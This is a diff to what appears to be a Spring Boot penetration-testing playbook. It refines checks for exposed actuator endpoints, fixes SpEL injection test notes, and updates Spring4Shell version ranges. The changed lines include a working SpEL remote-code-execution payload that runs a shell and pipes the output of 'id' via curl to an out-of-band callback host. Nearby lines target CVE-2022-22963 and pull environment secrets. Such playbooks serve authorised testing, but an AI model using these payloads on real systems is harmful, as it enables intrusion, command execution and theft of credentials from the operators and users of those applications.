@@ -53,8 +53,14 @@ ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics"
            "flyway" "liquibase" "refresh" "restart")
 
 for EP in "${ENDPOINTS[@]}"; do
-  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$EP")
-  [ "$STATUS" = "200" ] && echo "[+] EXPOSED: $BASE/$EP"
+  # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login
+  # page for many paths. Require actuator-shaped JSON (or a heapdump body)
+  # before calling it EXPOSED.
+  BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP")
+  CT=$(curl -s -o /dev/null -w "%{content_type}" -H "Accept: application/json" "$BASE/$EP")
+  if echo "$CT" | grep -qi "json" && ! echo "$BODY" | grep -qi "Whitelabel Error Page\|<html"; then
+    echo "[+] EXPOSED: $BASE/$EP"
+  fi
 done
 
 # Get environment variables (passwords, API keys)
@@ -120,7 +126,7 @@ curl -s "https://$TARGET/console" | grep -i "H2"
 
 ```bash
 # Spring Expression Language injection in user-controlled fields
-# Test: ${7*7} or #{7*7} → should not return 49 in response
+# Test: ${7*7} or #{7*7} → if the response reflects 49, SpEL is being evaluated
 
 # Common injection points:
 # - Email template fields: "Hello ${name}"
@@ -134,10 +140,12 @@ curl -s -X POST "https://$TARGET/api/user/name" \
   -d '{"name": "#{7*7}"}'
 # If returns 49 → SpEL injection confirmed
 
-# RCE payload
+# RCE payload — note: exec() returns a Process, not a String, so a bare
+# exec("id") produces NO visible output. Confirm via an OOB curl callback
+# (the spawned curl makes the network request even though nothing is reflected):
 curl -s -X POST "https://$TARGET/api/user/name" \
   -H "Content-Type: application/json" \
-  -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"}'
+  -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl COLLAB_HOST/spel-$(id|base64)\"})}"}'
 
 # CVE-2022-22963 — Spring Cloud Function SpEL
 curl -s -X POST "https://$TARGET/functionRouter" \
@@ -150,7 +158,8 @@ curl -s -X POST "https://$TARGET/functionRouter" \
 ## Phase 6 — Spring4Shell (CVE-2022-22965)
 
 ```bash
-# Affects: Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19
+# Affects: Spring Framework < 5.3.18 and < 5.2.20 (and all older branches);
+# fixed in 5.3.18 / 5.2.20. Requires JDK 9+ and WAR-on-Tomcat deployment.
 # Requires: Java 9+, Tomcat as WAR deployment
 
 # Detection: does the app accept class.* parameters?
